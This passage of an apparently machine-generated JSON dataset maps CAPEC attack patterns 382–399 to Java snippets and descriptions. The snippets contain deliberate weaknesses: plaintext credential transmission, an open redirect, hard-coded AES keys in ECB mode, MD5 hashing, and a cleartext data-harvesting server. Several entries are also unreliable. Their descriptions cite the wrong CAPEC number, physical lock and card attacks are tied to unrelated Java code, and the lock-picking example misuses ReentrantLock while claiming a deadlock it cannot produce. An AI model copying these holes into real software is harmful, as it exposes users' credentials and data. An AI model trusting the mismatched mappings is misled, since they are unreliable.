        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class IcmpProbe {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            byte[] buffer = new byte[1024];\n            InetAddress targetAddress = InetAddress.getByName(\"192.168.1.1\");\n            int targetPort = 12345; // Closed port\n\n            // Create a UDP packet with a specific ID\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, targetPort);\n            socket.send(packet);\n\n            // Wait for ICMP error message\n            DatagramPacket response = new DatagramPacket(new byte[1024], 1024);\n            socket.receive(response);\n\n            // Print the response for analysis\n            System.out.println(\"Received ICMP error message: \" + new String(response.getData()));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of an ICMP IP 'ID' Field Error Message Probe. The code sends a UDP datagram to a closed port on a target machine. When the target machine responds with an ICMP error message, the code captures and prints this message. This process can be used to observe how the target system handles the IP 'ID' field in the ICMP error message, which can help in fingerprinting the operating system. The code also touches on related CWEs by potentially revealing internal state information (CWE-204) and handling externally-generated error messages (CWE-211)."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class EventMonitor {\n    public static void main(String[] args) {\n        try {\n            ServerSocket serverSocket = new ServerSocket(8080);\n            System.out.println(\"Event Monitor started...\");\n\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                new Thread(new ClientHandler(clientSocket)).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ClientHandler(Socket socket) {\n        this.clientSocket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                // Log user information (user_id, username) in cleartext\n                System.out.println(\"Received: \" + inputLine);\n                // Simulate harvesting sensitive data\n                harvestData(inputLine);\n            }\n            in.close();\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void harvestData(String data) {\n        // Simulate storing harvested data\n        try (FileWriter fw = new FileWriter(\"harvested_data.txt\", true);\n             BufferedWriter bw = new BufferedWriter(fw);\n             PrintWriter out = new PrintWriter(bw)) {\n            out.println(data);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simplified version of an adversary hosting an event and monitoring data exchanged during the event. The `EventMonitor` class sets up a server socket to listen for incoming connections. When a client connects, a new thread is started to handle the client. The `ClientHandler` class reads data from the client in cleartext and logs it, simulating the harvesting of sensitive information such as user IDs and usernames. The harvested data is then stored in a file named 'harvested_data.txt'. This code embodies the main idea of CAPEC-94 by demonstrating how an adversary can monitor and harvest sensitive information during an event. The code also highlights related CWEs, such as CWE-311 (Missing Encryption of Sensitive Data) and CWE-319 (Cleartext Transmission of Sensitive Information), by showing the lack of encryption and the transmission of sensitive data in cleartext."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableAPIClient {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/api/data\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n\n            // CWE-311: Missing Encryption of Sensitive Data\n            String sensitiveData = \"user=admin&password=admin123\";\n            OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());\n            writer.write(sensitiveData);\n            writer.flush();\n            writer.close();\n\n            // Read response\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String line;\n            StringBuilder response = new StringBuilder();\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n\n            // CWE-345: Insufficient Verification of Data Authenticity\n            // CWE-346: Origin Validation Error\n            if (response.toString().contains(\"success\")) {\n                System.out.println(\"Data sent successfully.\");\n            } else {\n                System.out.println(\"Failed to send data.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable API client that sends sensitive data to a server without encryption (CWE-311). The client sends a POST request containing sensitive information (username and password) in plaintext. Additionally, the client does not verify the authenticity or origin of the server's response (CWE-345 and CWE-346), making it susceptible to man-in-the-middle attacks where an attacker could intercept and manipulate the data. This embodies the main idea of CAPEC-94, where an attacker can manipulate API messages to gain unauthorized access or perform other malicious activities."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class TransactionTampering {\n    public static void main(String[] args) throws Exception {\n        // Simulate a client sending a transaction\n        String originalMessage = \"Transaction: Send 100 coins to user123\";\n        System.out.println(\"Original Message: \" + originalMessage);\n\n        // Attacker intercepts and modifies the message\n        String tamperedMessage = tamperMessage(originalMessage);\n        System.out.println(\"Tampered Message: \" + tamperedMessage);\n\n        // Simulate sending the tampered message to the server\n        sendToServer(tamperedMessage);\n    }\n\n    private static String tamperMessage(String message) {\n        // CWE-471: Modification of Assumed-Immutable Data\n        return message.replace(\"100\", \"1000\");\n    }\n\n    private static void sendToServer(String message) throws IOException {\n        // CWE-311: Missing Encryption of Sensitive Data\n        Socket socket = new Socket(\"localhost\", 8080);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        out.println(message);\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a transaction tampering attack. The main idea is to show how an attacker can intercept and modify a transaction message before it is sent to the server. The original message 'Transaction: Send 100 coins to user123' is intercepted and modified to 'Transaction: Send 1000 coins to user123'. The tampered message is then sent to the server without encryption, highlighting CWE-311 (Missing Encryption of Sensitive Data). The tamperMessage method represents CWE-471 (Modification of Assumed-Immutable Data) by altering the transaction amount. This code embodies the CAPEC concept of 'Transaction or Event Tampering via Application API Manipulation' by demonstrating how an attacker can manipulate transaction data to deceive the system and the victim."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/profile\")\npublic class ProfileServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userId = request.getParameter(\"userId\");\n        String profileImageUrl = getProfileImageUrl(userId);\n        String profileLink = \"<a href='\" + profileImageUrl + \"'>View Profile</a>\";\n        response.getWriter().write(profileLink);\n    }\n\n    private String getProfileImageUrl(String userId) {\n        // Simulate fetching profile image URL from database\n        // CWE-345: Insufficient Verification of Data Authenticity\n        // CWE-346: Origin Validation Error\n        return \"http://example.com/profiles/\" + userId + \"/image.jpg\";\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to 'Application API Navigation Remapping' (CAPEC-111). The servlet generates a profile link based on a user-provided 'userId' parameter. The 'getProfileImageUrl' method constructs a URL without verifying the authenticity or origin of the 'userId' parameter (CWE-345 and CWE-346). An attacker could manipulate the 'userId' parameter to redirect users to a malicious site. This example highlights the risk of insufficient data validation and the potential for navigation remapping attacks."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String redirectUrl = request.getParameter(\"redirectUrl\");\n        String userData = request.getParameter(\"userData\");\n\n        // CWE-345: Insufficient Verification of Data Authenticity\n        if (userData != null && userData.equals(\"trustedData\")) {\n            // CWE-602: Client-Side Enforcement of Server-Side Security\n            response.sendRedirect(redirectUrl);\n        } else {\n            response.getWriter().write(\"Invalid data\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where an adversary can manipulate the 'redirectUrl' parameter to propagate malicious content. The code checks if 'userData' equals 'trustedData' but does not verify the authenticity of 'redirectUrl'. This can lead to CWE-345 (Insufficient Verification of Data Authenticity) and CWE-602 (Client-Side Enforcement of Server-Side Security). An attacker can exploit this by providing a malicious 'redirectUrl', causing the application to redirect users to a malicious site. The code represents the main idea of CAPEC-111: Navigation Remapping To Propagate Malicious Content."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class ButtonHijackingExample {\n    private static Map<String, String> buttonDestinations = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Initial button setup\n        buttonDestinations.put(\"submit\", \"https://trusted-site.com/submit\");\n        buttonDestinations.put(\"cancel\", \"https://trusted-site.com/cancel\");\n\n        // Simulate an attacker modifying the button destination\n        modifyButtonDestination(\"submit\", \"https://attacker-site.com/submit\");\n\n        // Simulate user clicking the submit button\n        String submitUrl = getButtonDestination(\"submit\");\n        System.out.println(\"Submit button points to: \" + submitUrl);\n    }\n\n    // Function to modify button destination (vulnerable to attack)\n    public static void modifyButtonDestination(String button, String newDestination) {\n        buttonDestinations.put(button, newDestination);\n    }\n\n    // Function to get button destination\n    public static String getButtonDestination(String button) {\n        return buttonDestinations.get(button);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of Application API Button Hijacking. The `buttonDestinations` map stores the URLs that buttons point to. The `modifyButtonDestination` method allows modification of these destinations, which is vulnerable to attack. An attacker can change the destination of the 'submit' button to a malicious URL. This example embodies CWE-471 (Modification of Assumed-Immutable Data) as it allows modification of button destinations that should be immutable. It also highlights CWE-345 (Insufficient Verification of Data Authenticity) and CWE-346 (Origin Validation Error) as there is no verification of the authenticity or origin of the new destination. CWE-602 (Client-Side Enforcement of Server-Side Security) is represented as the server relies on the client to maintain the integrity of button destinations. Finally, CWE-311 (Missing Encryption of Sensitive Data) is implied as the data is not encrypted during transmission or storage."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class ContentSpoofingExample {\n    public static void main(String[] args) throws IOException {\n        // Vulnerable to CAPEC-94: Adversary-in-the-Middle\n        URL url = new URL(\"http://example.com/api/data\");\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n\n        // CWE-353: Missing Support for Integrity Check\n        InputStream responseStream = connection.getInputStream();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(responseStream));\n        String line;\n        StringBuilder response = new StringBuilder();\n        while ((line = reader.readLine()) != null) {\n            response.append(line);\n        }\n        reader.close();\n\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // CWE-603: Use of Client-Side Authentication\n        if (response.toString().contains(\"<auth>\")) {\n            System.out.println(\"Authenticated: \" + response);\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n\n        // CWE-290: Authentication Bypass by Spoofing\n        // CWE-294: Authentication Bypass by Capture-replay\n        // Simulating an attacker modifying the response\n        String spoofedResponse = response.toString().replace(\"<auth>\", \"<auth>spoofed\");\n        System.out.println(\"Spoofed Response: \" + spoofedResponse);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker can manipulate the content of messages between a client and a server, embodying the main idea of CAPEC-94: Content Spoofing Via Application API Manipulation. The code fetches data from a URL without verifying the integrity of the data (CWE-353). It then performs client-side authentication checks (CWE-602, CWE-603), which can be bypassed by an attacker who captures and replays or modifies the network traffic (CWE-290, CWE-294). The attacker can spoof the response to include deceptive content, demonstrating the vulnerability."
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class PhysicalSecurityBypass {\n    private static final Logger logger = Logger.getLogger(PhysicalSecurityBypass.class.getName());\n    private static final String LOCK_FILE = \"/path/to/lockfile\";\n    private static final String ALERT_FILE = \"/path/to/alertfile\";\n\n    public static void main(String[] args) {\n        try {\n            // Bypass physical lock by deleting lock file\n            Files.deleteIfExists(Paths.get(LOCK_FILE));\n            logger.log(Level.INFO, \"Lock file deleted, physical lock bypassed.\");\n\n            // Disable alert by deleting alert file\n            Files.deleteIfExists(Paths.get(ALERT_FILE));\n            logger.log(Level.INFO, \"Alert file deleted, alert system disabled.\");\n        } catch (IOException e) {\n            logger.log(Level.SEVERE, \"An error occurred while bypassing physical security.\", e);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified scenario of bypassing physical security mechanisms, aligning with the CAPEC description of 'Bypassing Physical Security'. The code attempts to delete a lock file and an alert file, representing the physical lock and alert system respectively. This action simulates the bypassing of physical security controls and disabling of alert mechanisms, which is a common method used in physical security breaches. The code also logs the actions taken, which could be useful for an attacker to verify the success of their actions. This example incorporates the CWE concepts of improper physical access control (CWE-1263) and improper protection for outbound error messages and alert signals (CWE-1320) by demonstrating how an attacker might exploit these weaknesses to gain unauthorized access and disable security alerts."
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "public class PhysicalLockBypass {\n    private boolean lockBit = true; // Represents a lock bit that should prevent access\n    private boolean debugMode = false; // Represents a debug mode that can override locks\n\n    public boolean isAccessAllowed() {\n        if (debugMode) {\n            // CWE-1234: Debug mode allows override of locks\n            return true;\n        }\n        return !lockBit; // Access is allowed if lockBit is false\n    }\n\n    public void setLockBit(boolean value) {\n        // CWE-1231: Improper prevention of lock bit modification\n        this.lockBit = value;\n    }\n\n    public void enableDebugMode() {\n        this.debugMode = true;\n    }\n\n    public static void main(String[] args) {\n        PhysicalLockBypass lockBypass = new PhysicalLockBypass();\n        lockBypass.setLockBit(false); // Attempt to modify the lock bit\n        System.out.println(\"Access allowed: \" + lockBypass.isAccessAllowed()); // Should print true\n\n        lockBypass.setLockBit(true); // Set the lock bit\n        lockBypass.enableDebugMode(); // Enable debug mode\n        System.out.println(\"Access allowed in debug mode: \" + lockBypass.isAccessAllowed()); // Should print true\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified scenario of bypassing physical locks by manipulating a lock bit and using debug mode to override locks. The `PhysicalLockBypass` class contains a `lockBit` that represents a security lock and a `debugMode` that can override the lock. The `isAccessAllowed` method checks if access is allowed based on the state of the `lockBit` and `debugMode`. The `setLockBit` method allows modification of the lock bit, representing CWE-1231 (Improper Prevention of Lock Bit Modification). The `enableDebugMode` method enables debug mode, representing CWE-1234 (Hardware Internal or Debug Modes Allow Override of Locks). The `main` method demonstrates how an attacker might bypass the lock by modifying the lock bit or enabling debug mode."
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "public class LockMechanism {\n    private boolean lockBit = true; // Improper Prevention of Lock Bit Modification (CWE-1231)\n    private boolean powerState = true; // Improper Lock Behavior After Power State Transition (CWE-1232)\n    private String hardcodedKey = \"hardcodedKey123\"; // Use of Hard-coded Cryptographic Key (CWE-321)\n    private int failedAttempts = 0;\n    private final int MAX_ATTEMPTS = 3; // Overly Restrictive Account Lockout Mechanism (CWE-645)\n\n    public boolean unlock(String key) {\n        if (failedAttempts >= MAX_ATTEMPTS) {\n            System.out.println(\"Account locked due to too many failed attempts.\");\n            return false;\n        }\n\n        if (key.equals(hardcodedKey)) {\n            if (lockBit && powerState) {\n                System.out.println(\"Lock opened.\");\n                return true;\n            } else {\n                System.out.println(\"Lock bit or power state issue.\");\n                return false;\n            }\n        } else {\n            failedAttempts++;\n            System.out.println(\"Incorrect key.\");\n            return false;\n        }\n    }\n\n    public void resetPowerState() {\n        powerState = !powerState; // Simulate power state transition\n    }\n\n    public void modifyLockBit() {\n        lockBit = !lockBit; // Simulate improper modification of lock bit\n    }\n\n    public static void main(String[] args) {\n        LockMechanism lock = new LockMechanism();\n        lock.unlock(\"wrongKey\"); // Attempt with wrong key\n        lock.unlock(\"hardcodedKey123\"); // Attempt with correct key\n        lock.resetPowerState(); // Simulate power state transition\n        lock.unlock(\"hardcodedKey123\"); // Attempt after power state transition\n        lock.modifyLockBit(); // Simulate lock bit modification\n        lock.unlock(\"hardcodedKey123\"); // Attempt after lock bit modification\n    }\n}",
        "description": "This Java code snippet represents a simplified lock mechanism that embodies the main idea of the CAPEC 'Lock Bumping' and incorporates related CWEs. The lock mechanism uses a hardcoded key (CWE-321) to unlock, and it has a lock bit (CWE-1231) and power state (CWE-1232) that can be improperly modified. The code also includes an overly restrictive account lockout mechanism (CWE-645) that locks the account after a certain number of failed attempts. The main idea is to demonstrate how vulnerabilities in lock mechanisms can be exploited, similar to how a bump key exploits physical lock vulnerabilities."
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "import java.util.concurrent.locks.ReentrantLock;\n\npublic class LockPickingExample {\n    private static final ReentrantLock lock = new ReentrantLock();\n    private static boolean lockBit = false;\n\n    public static void main(String[] args) {\n        // Simulate improper prevention of lock bit modification (CWE-1231)\n        lockBit = true;\n        System.out.println(\"Lock bit set: \" + lockBit);\n\n        // Simulate unrestricted externally accessible lock (CWE-412)\n        if (lockBit) {\n            lock.lock();\n            try {\n                System.out.println(\"Lock acquired by external actor.\");\n                // Simulate unlocking a resource that is not locked (CWE-832)\n                if (!lock.isLocked()) {\n                    lock.unlock();\n                }\n            } finally {\n                lock.unlock();\n            }\n        }\n\n        // Simulate deadlock (CWE-833)\n        Thread t1 = new Thread(() -> {\n            lock.lock();\n            try {\n                System.out.println(\"Thread 1 acquired lock.\");\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            } finally {\n                lock.unlock();\n            }\n        });\n\n        Thread t2 = new Thread(() -> {\n            lock.lock();\n            try {\n                System.out.println(\"Thread 2 acquired lock.\");\n            } finally {\n                lock.unlock();\n            }\n        });\n\n        t1.start();\n        t2.start();\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to lock handling, inspired by the CAPEC 'Lock Picking' concept and associated CWEs. The code includes:\n\n1. **Improper Prevention of Lock Bit Modification (CWE-1231)**: The `lockBit` variable is set to `true`, simulating a scenario where the lock bit can be modified after being set.\n2. **Unrestricted Externally Accessible Lock (CWE-412)**: The lock is acquired based on the `lockBit` being `true`, representing an external actor influencing the lock.\n3. **Unlock of a Resource that is not Locked (CWE-832)**: The code attempts to unlock the `ReentrantLock` even if it is not locked, which can lead to runtime exceptions.\n4. **Deadlock (CWE-833)**: Two threads (`t1` and `t2`) attempt to acquire the same lock, potentially leading to a deadlock situation.\n\nThe code aims to illustrate how improper handling and manipulation of locks can lead to security vulnerabilities and system instability, akin to the physical lock picking described in the CAPEC."
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "public class LockMechanism {\n    private boolean lockBit = true; // Represents the lock bit\n    private boolean powerState = true; // Represents the power state (true for active, false for low power)\n    private boolean[] addressRegion = new boolean[100]; // Represents a large address region\n\n    public LockMechanism() {\n        // Initialize address region with default values\n        for (int i = 0; i < addressRegion.length; i++) {\n            addressRegion[i] = false; // All addresses are initially writable\n        }\n    }\n\n    public void setLockBit() {\n        if (lockBit) {\n            System.out.println(\"Lock bit is already set.\");\n        } else {\n            lockBit = true;\n            System.out.println(\"Lock bit set.\");\n        }\n    }\n\n    public void modifyAddress(int index, boolean value) {\n        if (lockBit) {\n            System.out.println(\"Modification not allowed. Lock bit is set.\");\n        } else {\n            addressRegion[index] = value;\n            System.out.println(\"Address modified.\");\n        }\n    }\n\n    public void powerTransition() {\n        powerState = !powerState;\n        if (!powerState) {\n            lockBit = false; // Lock bit becomes modifiable after power state transition\n            System.out.println(\"Entered low power state. Lock bit is now modifiable.\");\n        } else {\n            System.out.println(\"Woke up from low power state.\");\n        }\n    }\n\n    public static void main(String[] args) {\n        LockMechanism lockMechanism = new LockMechanism();\n        lockMechanism.setLockBit();\n        lockMechanism.modifyAddress(10, true); // Should not modify because lock bit is set\n        lockMechanism.powerTransition(); // Enter low power state\n        lockMechanism.modifyAddress(10, true); // Should modify because lock bit is now modifiable\n    }\n}",
        "description": "This Java code snippet represents a simplified lock mechanism that embodies the main idea of the CAPEC 'Using a Snap Gun Lock to Force a Lock' and incorporates related CWEs. The `LockMechanism` class simulates a lock bit that prevents modification of an address region when set. The `powerTransition` method simulates a power state transition, which makes the lock bit modifiable, representing CWE-1232 (Improper Lock Behavior After Power State Transition). The `modifyAddress` method attempts to modify an address in the region, but only succeeds if the lock bit is not set, illustrating CWE-1231 (Improper Prevention of Lock Bit Modification). The code demonstrates how a lock mechanism can be bypassed by exploiting power state transitions, similar to how a snap gun forces a lock into an unlocked position."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "import java.util.Arrays;\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\n\npublic class ElectronicLockBypass {\n    // CWE-321: Use of Hard-coded Cryptographic Key\n    private static final byte[] HARD_CODED_KEY = \"1234567890123456\".getBytes();\n\n    public static void main(String[] args) {\n        try {\n            // Simulate reading a magnetic strip card data\n            byte[] cardData = \"SensitiveCardData\".getBytes();\n\n            // Encrypt the card data using a broken cryptographic algorithm (CWE-327)\n            byte[] encryptedData = encryptData(cardData, HARD_CODED_KEY);\n\n            // Simulate an attacker decrypting the data using the hard-coded key\n            byte[] decryptedData = decryptData(encryptedData, HARD_CODED_KEY);\n\n            System.out.println(\"Decrypted Data: \" + new String(decryptedData));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static byte[] encryptData(byte[] data, byte[] key) throws Exception {\n        Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n        SecretKeySpec secretKey = new SecretKeySpec(key, \"AES\");\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n        return cipher.doFinal(data);\n    }\n\n    private static byte[] decryptData(byte[] data, byte[] key) throws Exception {\n        Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n        SecretKeySpec secretKey = new SecretKeySpec(key, \"AES\");\n        cipher.init(Cipher.DECRYPT_MODE, secretKey);\n        return cipher.doFinal(data);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified scenario of bypassing electronic locks and access controls by exploiting common weaknesses. The code uses a hard-coded cryptographic key (CWE-321) to encrypt and decrypt sensitive card data, representing a magnetic strip card. The encryption algorithm used is AES in ECB mode, which is considered a broken or risky cryptographic algorithm (CWE-327). An attacker could easily decrypt the data using the hard-coded key, illustrating the vulnerability described in the CAPEC. This example highlights the risks associated with using hard-coded keys and weak cryptographic algorithms in electronic access control systems."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Base64;\n\npublic class CardAuthentication {\n    private static final String SECRET_KEY = \"secret\";\n\n    public static void main(String[] args) throws NoSuchAlgorithmException {\n        String cardData = \"123456789\";\n        String hashedData = hashCardData(cardData);\n        System.out.println(\"Hashed Card Data: \" + hashedData);\n\n        // Simulate an authentication bypass by spoofing\n        if (authenticateCard(hashedData)) {\n            System.out.println(\"Authentication Successful\");\n        } else {\n            System.out.println(\"Authentication Failed\");\n        }\n    }\n\n    private static String hashCardData(String data) throws NoSuchAlgorithmException {\n        MessageDigest md = MessageDigest.getInstance(\"MD5\"); // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n        md.update((data + SECRET_KEY).getBytes());\n        byte[] digest = md.digest();\n        return Base64.getEncoder().encodeToString(digest);\n    }\n\n    private static boolean authenticateCard(String hashedData) {\n        // CWE-290: Authentication Bypass by Spoofing\n        String spoofedData = \"spoofedData\";\n        return hashedData.equals(spoofedData);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable card authentication system. The `hashCardData` method uses the MD5 hashing algorithm, which is considered broken and risky (CWE-327). The `authenticateCard` method simulates an authentication bypass by spoofing (CWE-290), where it compares the hashed card data with a spoofed data string, leading to a potential security breach. This code embodies the main idea of the deprecated CAPEC related to bypassing card or badge-based systems by highlighting weaknesses in cryptographic algorithms and authentication mechanisms."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "import java.io.*;\nimport java.util.*;\n\nclass MagstripeCard implements Cloneable {\n    private String cardData;\n\n    public MagstripeCard(String data) {\n        this.cardData = data;\n    }\n\n    public String getCardData() {\n        return cardData;\n    }\n\n    @Override\n    protected Object clone() throws CloneNotSupportedException {\n        return super.clone();\n    }\n\n    public static void main(String[] args) {\n        try {\n            // Simulate reading card data from a magstripe reader\n            MagstripeCard originalCard = new MagstripeCard(\"1234-5678-9012-3456\");\n            System.out.println(\"Original Card Data: \" + originalCard.getCardData());\n\n            // Clone the card to simulate duplication\n            MagstripeCard clonedCard = (MagstripeCard) originalCard.clone();\n            System.out.println(\"Cloned Card Data: \" + clonedCard.getCardData());\n\n            // Demonstrate that the cloned card has the same data\n            if (originalCard.getCardData().equals(clonedCard.getCardData())) {\n                System.out.println(\"Card successfully cloned.\");\n            }\n        } catch (CloneNotSupportedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the vulnerability of cloning magnetic stripe cards, as described in the CAPEC. The `MagstripeCard` class contains sensitive card data and implements the `Cloneable` interface, allowing the card data to be duplicated easily. The `main` method simulates reading card data from a magstripe reader, cloning the card, and verifying that the cloned card contains the same data as the original. This represents the ease with which an attacker can duplicate a magstripe card if they have temporary access to it. The code also touches on CWE-498 (Cloneable Class Containing Sensitive Information) by showing how sensitive data can be cloned, leading to unauthorized access."
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class MagneticStripCardBruteForce {\n    // CWE-321: Use of Hard-coded Cryptographic Key\n    private static final String HARD_CODED_KEY = \"1234567890ABCDEF\";\n    private static Map<String, String> cardData = new HashMap<>();\n\n    static {\n        // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n        cardData.put(\"1234567890123456\", encryptData(\"user1\", HARD_CODED_KEY));\n        cardData.put(\"6543210987654321\", encryptData(\"user2\", HARD_CODED_KEY));\n    }\n\n    public static void main(String[] args) {\n        String cardNumber = \"1234567890123456\";\n        String encryptedData = cardData.get(cardNumber);\n\n        if (encryptedData != null) {\n            // CWE-290: Authentication Bypass by Spoofing\n            if (authenticate(cardNumber, encryptedData)) {\n                System.out.println(\"Access Granted\");\n            } else {\n                System.out.println(\"Access Denied\");\n            }\n        } else {\n            System.out.println(\"Card Not Recognized\");\n        }\n    }\n\n    private static String encryptData(String data, String key) {\n        // Simulate encryption (not secure)\n        return data + key;\n    }\n\n    private static boolean authenticate(String cardNumber, String encryptedData) {\n        // CWE-307: Improper Restriction of Excessive Authentication Attempts\n        for (int i = 0; i < 1000; i++) { // Simulate brute force attempts\n            if (cardData.containsKey(cardNumber) && cardData.get(cardNumber).equals(encryptedData)) {\n                return true;\n            }\n        }\n        return false;\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified scenario of a magnetic strip card brute force attack. The code includes several vulnerabilities: \n1. CWE-321: Use of a Hard-coded Cryptographic Key - The encryption key is hard-coded, making it easy to compromise.\n2. CWE-327: Use of a Broken or Risky Cryptographic Algorithm - The encryption method is insecure and easily reversible.\n3. CWE-290: Authentication Bypass by Spoofing - The authentication mechanism can be bypassed by spoofing valid card data.\n4. CWE-307: Improper Restriction of Excessive Authentication Attempts - The code does not limit the number of authentication attempts, allowing brute force attacks.\n\nThe main idea is to show how an adversary can analyze and generate valid card sequences to gain unauthorized access by exploiting these weaknesses."
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class RFIDCloning {\n    private static Map<String, String> rfidDatabase = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate adding RFID tags to the database\n        addRFIDTag(\"12345\", \"Employee1\");\n        addRFIDTag(\"67890\", \"Employee2\");\n\n        // Simulate cloning an RFID tag\n        String clonedTag = cloneRFIDTag(\"12345\");\n        System.out.println(\"Cloned RFID Tag: \" + clonedTag);\n\n        // Simulate using the cloned tag\n        if (authenticateRFIDTag(clonedTag)) {\n            System.out.println(\"Access Granted\");\n        } else {\n            System.out.println(\"Access Denied\");\n        }\n    }\n\n    private static void addRFIDTag(String tagId, String owner) {\n        rfidDatabase.put(tagId, owner);\n    }\n\n    private static String cloneRFIDTag(String originalTagId) {\n        // Vulnerability: Cloning the RFID tag by simply copying the tag ID\n        return originalTagId;\n    }\n\n    private static boolean authenticateRFIDTag(String tagId) {\n        // Vulnerability: Insecure Security Identifier Mechanism\n        return rfidDatabase.containsKey(tagId);\n    }\n}",
